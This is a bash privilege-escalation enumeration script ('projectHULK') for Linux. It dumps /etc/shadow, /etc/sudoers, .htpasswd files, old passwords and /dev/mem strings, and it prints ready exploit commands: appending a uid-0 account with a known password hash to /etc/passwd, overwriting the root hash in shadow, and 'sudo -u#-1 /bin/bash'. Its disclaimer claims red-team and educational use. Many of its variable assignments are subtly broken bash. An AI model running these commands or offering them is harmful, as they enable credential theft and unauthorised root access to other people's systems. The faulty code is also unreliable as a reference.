#!/bin/bash

#------------------> Clear Screen:
echo -e "\n\nClearing Terminal"
sleep 0.5
clear= clear 
echo -e "$clear"
echo -e "\n\nLoading Script..."
sleep 1.5
Loading= clear 
echo -e "$Loading"
#------------------> Banner:
    echo -e "\n"
    echo -e "\n"
    echo -e "\t\t\t╔════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\t\t\t║██████╗ ██████╗ █████╗       ██╗███████╗ █████╗ ████████╗      ██╗  ██╗██╗   ██╗██╗     ██╗  ██╗║"
    echo -e "\t\t\t║██╔══██╗██╔══██╗██╔══██╗     ██║██╔════╝██╔══██╗╚══██╔══╝      ██║  ██║██║   ██║██║     ██║ ██╔╝║"
    echo -e "\t\t\t║██████╔╝██████╔╝██║  ██║     ██║█████╗  ██║  ╚═╝   ██║         ███████║██║   ██║██║     █████═╝ ║"
    echo -e "\t\t\t║██╔═══╝ ██╔══██╗██║  ██║██╗  ██║██╔══╝  ██║  ██╗   ██║  █████  ██╔══██║██║   ██║██║     ██╔═██╗ ║"
    echo -e "\t\t\t║██║     ██║  ██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝   ██║         ██║  ██║╚██████╔╝███████╗██║ ╚██╗║"
    echo -e "\t\t\t║╚═╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚══════╝ ╚════╝    ╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝║"
    echo -e "\t\t\t╚═════════════════════════════════════════════════════════════{\033[31mPrivilege Escalation Script v2.0\033[0m}═╝"
    sleep 1
    #------------------> Declaration:
    echo -e "\n\033[0;37;44mDeclaration:\033[0m"
    sleep 0.1
    echo -e "\tThe script has been designed to help (SOC/Red Team) or can be used for educational purposes in finding system vulnerabilities that"
    echo -e "\tmay lead to privilege escalation & it should be used in safe environment. The author is not responsible for any misuse of it. Therefor,"
    echo -e "\tby reading this, you take full responsibility of misusing it."
    sleep 0.1
    #------------------> Author:
    echo -e "\n\033[0;37;44mAuthor:\033[0m"
    sleep 0.1
    echo -e "\t     Iron Hulk"
    echo -e "\tMan In A Black Tuxedo"
    sleep 0.1
    #------------------> Tweet Me:
    echo -e "\n\033[0;37;44mTweet Me:\033[0m"
    sleep 0.1
    echo -e "\tIronHulk_x69"
    sleep 0.1
    #------------------> Message:
    echo -e "\n\033[0;37;44mMessage:\033[0m"
    sleep 0.1
    echo -e "\tAll the exploits have been listed based on the author's opinion, you may use any of your choice"
    echo -e "\trememebr, SKY HAS NO LIMITS :)"
    sleep 0.1
    #------------------> Recommendation:
    echo -e "\n\033[0;37;44mRecommendation:\033[0m"
    sleep 0.1
    echo -e "\tFor a better view of the report is it recommended redirecting the output to a file: ./projectHULK.sh > PE_report.txt"
    echo -e "\tNever relay on a single tool, do manual enumeration and try to use many tools as much as you can, here are some good tools:-"
    echo -e "\t╚════{ LinEnum: git clone https://github.com/rebootuser/LinEnum.git"
    echo -e "\t╚════{ SUID3NUM: git clone https://github.com/Anon-Exploiter/SUID3NUM.git"
    echo -e "\t╚════{ LinPeas: git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git"
    echo -e "\t╚════{ Linux-Exploit-Suggester: git clone https://github.com/jondonas/linux-exploit-suggester-2.git"
    sleep 0.1
    #------------------> Send a report:
    echo -e "\n\033[0;37;44mSend a report:\033[0m"
    sleep 0.1
    echo -e "\tIf you are working remotely, you can send the report by one of the following:"
    send_file= which wget netcat nc ssh ftp tftp python python2.7 python3 smb
    echo -e "$send_file"
    echo -e "\n\tFile Transfer Cheatsheet:"
    echo -e "\thttps://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/ "
    sleep 0.1
    #------------------> Start time"
    echo -e "\n\033[0;37;44mScan Started At:\033[0m"
    sleep 0.1
    echo -e "\t"; date
    #------------------> Enumeration:
    echo -e "\n\n\033[31m\t\t\tEnumeration on progress #................................................................................. 1%\033[0m\n\n"
    sleep 5
#------------------> Current User Information:
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]------------------------------------------------------- [ Current User Information ] -------------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> Current user is:
    echo -e "\n\033[0;37;44m[+] Current user is:\033[0m"
    me= whoami 2>/dev/null 
    echo -e "$me"
    #------------------> User may run sudo on:
    echo -e "\n\033[0;37;44m[+] User may run sudo on:\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Do sudo -l manually & try to use a password, if you know, I can't do that.    ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
        sleep 1
    #------------------> User ID:
    echo -e "\n\033[0;37;44m[+] User ID:\033[0m"
    user_id= id 2>/dev/null 
    echo -e "$user_id"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc,     ║"
        echo -e "\t  ║Docker, Wheel, Shadow, Disk, Video. Every group worths Googling for exploit.  ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Who is logged in:
    echo -e "\n\033[0;37;44m[+] Who's logged in:\033[0m"
    w= w
    echo -e "$w"
    #------------------> Login History:
    echo -e "\n\033[0;37;44m[+] Login History:\033[0m"
    l_history= last -Faiw | last | grep still --color=always
    echo -e "$l_history"
    #------------------> Last Log In:
    echo -e "\n\033[0;37;44m[+] Last Log In:\033[0m"
    l_login= lastlog | grep -v "**Never logged in**" 
    echo -e "$l_login"
    #------------------> Root Users:
    echo -e "\n\033[0;37;44m[+] Root Users:\033[0m"
    superusers= awk -F: '($3 == '0') {print}' /etc/passwd 
    echo -e "$superusers"
    #------------------> Users with console:
    echo -e "\n\033[0;37;44m[+] Users with console:\033[0m"
    console= cat /etc/passwd | grep --color=always '/bin/bash\|/bin/sh\|/bin/zsh'
    echo -e "$console"
    #------------------> Total number of users:
    echo -e "\n\033[0;37;44m[+] Total number of users:\033[0m"
    total_user= getent passwd | wc -l
    echo -e "$total_user"
    #------------------> User Group & possible escap:
    echo -e "\n\033[0;37;44m[+] User Group & possible escap:\033[0m"
    poss= id | grep --color=always -i "docker\|lxd\|sambashare\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow" 2>/dev/null
    echo -e "$poss"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Esc Docker:-                                                                                                     ║"
        echo -e "\t  ║https://gtfobins.github.io/gtfobins/docker/                                                                      ║"
        echo -e "\t  ║https://www.hackingarticles.in/docker-privilege-escalation/                                                      ║"
        echo -e "\t  ║=================================================================================================================║"
        echo -e "\t  ║Esc LXD/LXC:-                                                                                                    ║"
        echo -e "\t  ║https://www.hackingarticles.in/lxd-privilege-escalation/                                                         ║"
        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                           ║"
        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation ║"
        echo -e "\t  ║=================================================================================================================║"
        echo -e "\t  ║Esc from Samashare:-                                                                                             ║"
        echo -e "\t  ║https://www.securityfocus.com/bid/9619/exploit                                                                   ║"
        echo -e "\t  ║=================================================================================================================║"
        echo -e "\t  ║Esc from lpadmin:-                                                                                               ║"
        echo -e "\t  ║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                         ║"
        echo -e "\t  ║Usually members of the group adm have permissions to read log files located inside /var/log/                     ║"
        echo -e "\t  ║Usually members of the group adm have permissions to read log files located inside /var/log/                     ║"
        echo -e "\t  ║=================================================================================================================║"
        echo -e "\t  ║Esc from sudo/admin:-                                                                                            ║"
        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
        echo -e "\t  ║=================================================================================================================║"
        echo -e "\t  ║The video group can be used locally to give a set of users access to a video device or to the screen output.     ║"
        echo -e "\t  ║This could be exploited by taking a screenshot of the current screen output and gathering any private information║"
        echo -e "\t  ║such as user passwords or hashes.                                                                                ║"
        echo -e "\t  ║Esc from video:-                                                                                                 ║"
        echo -e "\t  ║https://github.com/frizb/Linux-Privilege-Escalation                                                              ║"
        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
        echo -e "\t  ║=================================================================================================================║"
        echo -e "\t  ║The disk group provides users with access to the raw data contained in disks and partitions.                     ║"
        echo -e "\t  ║Esc from disk:-                                                                                                  ║"
        echo -e "\t  ║https://github.com/frizb/Linux-Privilege-Escalation                                                              ║"
        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
        echo -e "\t  ║=================================================================================================================║"
        echo -e "\t  ║Since users in this group have access to view the /etc/shadow file, this can be exploited by cracking password   ║"
        echo -e "\t  ║hashes found in it.                                                                                              ║"
        echo -e "\t  ║Esc from shadow:-                                                                                                ║"
        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
        echo -e "\t  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"

#------------------> Password File Permission & Users:
    echo -e "\n"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]--------------------------------------------------- [ Password File Permission & Users ] ---------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> what is Password File:
    echo -e "\n\033[0;37;44m[+] Each field is separated by a colon, and represents a different attribute to the user:\033[0m"
    echo -e "\t  ╔════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\t  ║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell>   ║"
    echo -e "\t  ║If an -x- is representing the password field, this indicates that the password  ║"
    echo -e "\t  ║is encrypted.                                                                   ║"
    echo -e "\t  ╚════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Password File:
    echo -e "\n\033[0;37;44m[+] Password file:\033[0m"
    ls_passwd= ls -la /etc/passwd --color=always
    echo -e "$ls_passwd"
        echo -e "\t  ╔════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If the file has written permission, it can be abused by adding a new user with  ║"
        echo -e "\t  ║root privilege to the file. If it's no't writable, then it's protected.         ║"
        echo -e "\t  ║\033[31mExploite:\033[0m                                                                       ║"
        echo -e "\t  ║\033[31mFirst, generate a password with one of the following commands:\033[0m                  ║"
        echo -e "\t  ║    \033[31mopenssl passwd -1 -salt hulk password\033[0m                                       ║"
        echo -e '\t  ║    \033[31mperl -le ''print crypt("hulk", "password")\033[0m                                    ║'
        echo -e "\t  ║\033[31mRewrite the password file:\033[0m                                                      ║"
        echo -e '\t  ║    \033[31mecho "hulk:HASH:0:0::/root:/bin/bash" >> /etc/passwd"\033[0m                       ║'
        echo -e "\t  ║\033[31mThen do: su hulk\033[0m                                                                ║"
        echo -e "\t  ║Read more:                                                                      ║"
        echo -e "\t  ║https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/║"
        echo -e "\t  ║Protect the file by limiting the access to it:                                  ║"
        echo -e "\t  ║chmod 600 /etc/passwd                                                           ║"
        echo -e "\t  ╚════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] Reading The Password File:\033[0m"
    read_passwd= cat /etc/passwd 
    echo -e "$read_passwd"
   #------------------> Hash in Password File:
    echo -e "\n\033[0;37;44m[+] Hash in Password file:\033[0m"
    hash_pass= grep  -v 'x' /etc/passwd
    echo -e "$hash_pass"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If any hash is found in the /etc/passwd, the attacker my try to crack it by using  ║"
        echo -e "\t  ║any hash cracker software, tool or website.                                        ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Shadow File:
    echo -e "\n\033[0;37;44m[+] Shadow file:\033[0m"
    ls_shadow= ls -la /etc/shadow --color=always
    echo -e "$ls_shadow"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If the file has read/write permission, it can abuse by replacing the root HASH     ║"
        echo -e "\t  ║with the attacker's HASH or the attacker my copy the hash & try to crack it.       ║"
        echo -e "\t  ║\033[31mExploite:\033[0m                                                                          ║"
        echo -e "\t  ║\033[31m1) Generate a new Shadow Hash and replace it with the\033[0m                              ║"
        echo -e "\t  ║   \033[31mcurrent root hash:\033[0m                                                              ║"
        echo -e "\t  ║    \033[31m- mkpasswd  -m sha-512 -S prove123 -s\033[0m                                          ║"
        echo -e "\t  ║\033[31m2) Open the shadow file using any text edirot of your choice:\033[0m                      ║"
        echo -e "\t  ║   \033[31mor copy your HASH from your system and replace it with\033[0m                          ║"
        echo -e "\t  ║   \033[31mthe root hash\033[0m                                                                   ║"
        echo -e "\t  ║\033[31m3) Login to root using your password\033[0m                                               ║"
        echo -e "\t  ║\033[31m4) Or Simply do:\033[0m                                                                   ║"
        echo -e '\t  ║\033[31mecho "privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash" >> /etc/passwd\033[0m             ║'
        echo -e "\t  ║\033[31mThis adds a root privilege user 'privesc' with the password 'password'\033[0m             ║"
        echo -e "\t  ║Read More:                                                                         ║"
        echo -e "\t  ║https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html ║"
        echo -e "\t  ║Protect the file by limiting the access to it:                                     ║"
        echo -e "\t  ║chmod 600 /etc/shadow                                                              ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] Reading shadow File:\033[0m"
    read_shadow= cat /etc/shadow 
    echo -e "$read_shadow"
       #------------------> Hash in Shadow File:
    echo -e "\n\033[0;37;44m[+] Hash in Shadow file:\033[0m"
    hash_shadow= grep  -v '*:\|!:' /etc/shadow
    echo -e "$hash_shadow"
    #------------------> Sudoers File:
    echo -e "\n\033[0;37;44m[+] Sudoers File:\033[0m"
    ls_sudo= ls -la /etc/sudoers --color=always
    echo -e "$ls_sudo"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║<Username> <All terminal>=<All user>:<All Group> <comand to execute>                                 ║"
        echo -e "\t  ║Read more:                                                                                           ║"
        echo -e "\t  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] Reading Sudoers File:\033[0m"
    read_sudo= cat /etc/sudoers 
    echo -e "$read_sudo"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║The file shows a fully detailed about what the current user my run as root. If the running file or the║"
        echo -e "\t  ║application has a global vulnerability, the attacker may google it and abuse it for user escalation.  ║"
        echo -e "\t  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d  ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> User Group Lists:
    echo -e "\n\033[0;37;44m[+] User Group list:\033[0m"
    ls_group= ls -la /etc/group --color=always
    echo -e "$ls_group"
    echo -e "\n\033[0;37;44m[+] Content of User Group list:\033[0m"
    read_group= cat /etc/group 
    echo -e "$read_group"
    #------------------> Password Policy:
    echo -e "\n\033[0;37;44m[+] Password Policy:\033[0m"
    policy=  grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 
    echo -e "$policy"
    #------------------> WiFi Creds:
    echo -e "\n\033[0;37;44m[+] WiFi Creds:\033[0m"
    wifi= ls -la /etc/NetworkManager/system-connections 
    echo -e "$wifi"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Try to read the following files manually and see if they have any passwords stored inside them.      ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Sensitive files:
    echo -e "\n\033[0;37;44m[+] Sensitive files:\033[0m"
    sens_file= ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
    echo -e "$sens_file"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║See if any listed files have week file permission.                                                   ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> htpasswd:
    echo -e "\n\033[0;37;44m[+] htpasswd:\033[0m"
    htpasswd= find / -name .htpasswd -print -exec cat {} \; 2>/dev/null 
    echo -e "$htpasswd"
        echo -e "\t  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║It is a flat-file used to store usernames and password. This file is generally used by the web server║"
        echo -e "\t  ║software like Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are║"
        echo -e "\t  ║in ASCII text format. The hash maybe cracked using online tools or any cracking password tools.      ║"
        echo -e "\t  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> In memory passwords:
    echo -e "\n\033[0;37;44m[+] In memory passwords:\033[0m"
    mem_pass= strings /dev/mem -n10 | grep -i PASS
    echo -e "$mem_pass"
    #------------------> Old passwords:
    echo -e "\n\033[0;37;44m[+] Old passwords:\033[0m"
    Old_passwords= ls -la /etc/security/opasswd --color=always
    echo -e "$Old_passwords"
    echo -e "\n\033[0;37;44m[+] Reading Old passwords:\033[0m"
    R_Old_passwords= cat /etc/security/opasswd
    echo -e "$R_Old_passwords"
    #------------------> Root History File:
    echo -e "\n\033[0;37;44m[+] Root History File:\033[0m"
    root_history= ls -la /root/.*_history --color=always 2>/dev/null
    echo -e "$root_history"
    #------------------> Password Files:
    echo -e "\n\033[0;37;44m[+] Password Files:\033[0m"
    pass_files= find / -name passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
    echo -e "$pass_files"
    echo -e "\n\033[0;37;44m[+] apache2.conf:\033[0m"
    apa_con_pass=cat /etc/apache2/apache2.conf | grep -i "pass\|cred\|hash" --color=always
    echo -e "$apa_con_pass"
    echo -e "\n\033[0;37;44m[+] smb.conf:\033[0m"
    smb_conf_pass= cat /etc/samba/smb.conf | grep -i 'pass\|cred\|hash' --color=always
    echo -e "$smb_conf_pass"
    echo -e "\n\033[0;37;44m[+] All files having word "password/credentials":\033[0m"
    pass_cred= grep -rn -i "pass\|cred\|hash" * --color=always
    echo -e "$pass_cred"
#------------------> System Information:
    echo -e "\n"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]---------------------------------------------------------- [ System Information ] ----------------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> System Name:
    echo -e "\n\033[0;37;44m[+] System Name:\033[0m"
    s_name= uname -a 2>/dev/null 
    echo -e "$s_name"
    #------------------> System Release:
    echo -e "\n\033[0;37;44m[+] System Release:\033[0m"
    lsb= lsb_release -a 2>/dev/null 
    echo -e "$lsb"
    #------------------> Host Name:
    echo -e "\n\033[0;37;44m[+] Host name:\033[0m"
    h_name= hostname 2>/dev/null 
    echo -e "$h_name"
    #------------------>s System Version:
    echo -e "\n\033[0;37;44m[+] System Version:\033[0m"
    sys_ver= cat /proc/version 
    echo -e "$sys_ver"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║The version is not listed in our database. However, make sure to keep your    ║"
        echo -e "\t  ║system always up-to-date. Old version are always vulnerable. Visit the link   ║"
        echo -e "\t  ║bellow for more details:                                                      ║"
        echo -e "\t  ║https://github.com/SecWiki/linux-kernel-exploits                              ║"
        echo -e "\t  ║Or use:                                                                       ║"
        echo -e '\t  ║searchsploit "Linux Kernel"                                                   ║'
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
        echo -e "\n\033[0;37;41mList of vulnerable kernel versions:\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 ║"
        echo -e "\t  ║3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1║"
        echo -e "\t  ║3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    ║"
        echo -e "\t  ║2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 ║"
        echo -e "\t  ║2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  ║"
        echo -e "\t  ║2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   ║"
        echo -e "\t  ║2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  ║"
        echo -e "\t  ║2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Sudo Version:
    echo -e "\n\033[0;37;44m[+] Sudo Version:\033[0m"
    su_ver= sudo -V | grep --color=always "Sudo version" 2>/dev/null 
    echo -e "$su_ver"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║The version is not listed in our database. However, make sure to keep your    ║"
        echo -e "\t  ║system always up-to-date. Old version are vulnerable. Use Google for more     ║"
        echo -e "\t  ║details or use:                                                               ║"
        echo -e '\t  ║searchsploit "sudo"                                                           ║'
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Is sudo version vulnerable:
    echo -e "\n\033[0;37;44m[+] Is sudo version vulnerable?\033[0m"
    su_vul= sudo -V | grep --color=always "Sudo ver" | grep --color=always "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]" 
    echo -e "$su_vul"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If the sudo version <= v1.28, it is exploitable                               ║"
        echo -e "\t  ║\033[31mExploite:\033[0m                                                                     ║"
        echo -e "\t  ║\033[31msudo -u#-1 /bin/bash\033[0m                                                          ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Path Environment:
    echo -e "\n\033[0;37;44m[+] Path Environment:\033[0m"
    path_env= systemctl show-environment 2>/dev/null 
    echo -e "$path_env"
    echo -e "\n\033[0;37;44m[+] System Path:\033[0m"
    path_path= echo $PATH 
    echo -e "$path_path"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If you have write permissions on any folder inside the PATH variable you may be able to hijack║"
        echo -e "\t  ║some libraries or binaries. Read more:                                                        ║"
        echo -e "\t  ║https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/ ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Lists block devices (hardrives, memory cards, etc):
    echo -e "\n\033[0;37;44m[+] Lists block devices (hardrives, memory cards, etc):\033[0m"
    lsblk= lsblk -a 
    echo -e "$lsblk"
    #------------------> Lists USB devices:
    echo -e "\n\033[0;37;44m[+] Lists USB devices:\033[0m"
    lsusb= lsusb 
    echo -e "$lsusb"
    #------------------> Information about SATA Devices for /dev/sda1:
    echo -e "\n\033[0;37;44m[+] Information about SATA Devices for /dev/sda1:\033[0m"
    dev_sda= hdparm /dev/sda1 2>/dev/null 
    echo -e "$dev_sda"
    #------------------> Linux File System Information:
    echo -e "\n\033[0;37;44m[+] Linux File System Information:\033[0m"
    fdisk= fdisk -l 2>/dev/null 
    echo -e "$fdisk"
    #------------------> List of running services:
    echo -e "\n\033[0;37;44m[+] List of running services:\033[0m"
    status_all= service --status-all 
    echo -e "$status_all"
    #------------------> File-systems mounted:
    echo -e "\n\033[0;37;44m[+] File-systems mounted:\033[0m"
    systems_mounted= df -h 2>/dev/null 
    echo -e "$systems_mounted"
    #------------------> Enumeration:
    echo -e "\n\n\033[31m\t\t\tEnumeration on progress ###################............................................................... 20%\033[0m\n\n"
    sleep 5
#------------------> System Date/Time:
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]----------------------------------------------------------- [ System Date/Time ] -----------------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> System Up Time:
    echo -e "\n\033[0;37;44m[+] System Up Time:\033[0m"
    up_time= uptime | sed -E 's/^[^,]*up *//; s/, *[[:digit:]]* users.*//; s/min/minutes/; s/([[:digit:]]+):0?([[:digit:]]+)/\1 hours, \2 minutes/'
    echo -e "$up_time"
    #------------------> System Date:
    echo -e "\n\033[0;37;44m[+] System Date:\033[0m"
    s_date= date 2>/dev/null 
    echo -e "$s_date"
    #------------------> CPU Information:
    echo -e "\n\033[0;37;44m[+] CPU Information:\033[0m"
    cpu_info= lscpu 2>/dev/null 
    echo -e "$cpu_info"
    #------------------> System Timer:
    echo -e "\n\033[0;37;44m[+] System Timer List:\033[0m"
    sys_timer= systemctl list-timers --all 2>/dev/null 
    echo -e "$sys_timer"
#------------------> System SUID:
    echo -e "\n"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]------------------------------------------------------------- [ System SUID ] --------------------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> What is SUID/GUID:
    echo -e "\n\033[0;37;44m[+] What is SUID/GUID?\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║SUID (Set User ID) and SGIDs (Set Group ID) executables are those that execute║"
        echo -e "\t  ║with the permission of the owner (SUID) or group (SGID). You can identify SUID║"
        echo -e "\t  ║and SGIDs by a representative 's' in the execute permission field the file:   ║"
        echo -e "\t  ║-rwsr-sr-x can often be exploited to gain root privilege.                     ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Find capability:
    echo -e "\n\033[0;37;44m[+] Find capability files:\033[0m"
    capa= getcap -r / 2>/dev/null
    echo -e "$capa"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Capability files are different from system to another system. Googling them my║"
        echo -e "\t  ║revile a way of how to exploit them.                                          ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] Capability with setui+ep:\033[0m"
    capa2= getcap -r / 2>/dev/null | grep cap_setuid+ep
    echo -e "$capa2"
    #------------------> Built-in Binaries:
    echo -e "\n\033[0;37;44m[+] Built-in Binaries:\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Most linux system have these Binaries, and they are built-in, no escalation   ║"
        echo -e "\t  ║is done by them unless file permission has been change.                       ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
            echo -e "\t  /usr/sbin/pppd"
            echo -e "\t  /usr/sbin/exim4"
            echo -e "\t  /usr/bin/ntfs-3g"
            echo -e "\t  /usr/bin/chsh"
            echo -e "\t  /usr/bin/su"
            echo -e "\t  /usr/bin/chfn"
            echo -e "\t  /usr/bin/mount"
            echo -e "\t  /usr/bin/sudo"
            echo -e "\t  /usr/bin/umount"
            echo -e "\t  /usr/bin/pkexec"
            echo -e "\t  /usr/bin/passwd"
            echo -e "\t  /usr/bin/newgrp"
            echo -e "\t  /usr/bin/gpasswd"
            echo -e "\t  /usr/bin/fusermount"
            echo -e "\t  /usr/sbin/mount.nfs"
            echo -e "\t  /usr/sbin/mount.cifs"
            echo -e "\t  /usr/lib/xorg/Xorg.wrap"
            echo -e "\t  /usr/lib/openssh/ssh-keysign"
            echo -e "\t  /usr/lib/chromium/chrome-sandbox"
            echo -e "\t  /usr/libexec/polkit-agent-helper-1"
